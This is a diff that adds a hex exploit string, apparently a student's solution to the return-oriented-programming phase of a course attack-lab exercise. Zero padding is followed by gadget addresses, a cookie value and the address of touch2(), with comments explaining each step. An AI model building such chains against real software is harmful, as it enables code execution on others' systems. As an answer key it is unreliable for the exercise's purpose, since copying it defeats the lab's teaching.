@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1d 1e 40 00 00 00 00 00 /* call <setval_317> to pop %rax, mov %rax to %rdi, and return */
+98 c6 3e 22 00 00 00 00 /* pops this (the cookie) */
+20 1e 40 00 00 00 00 00 /* just call the return at the end of the gadget for segfault */
+a3 1c 40 00 00 00 00 00 /* call touch2() */
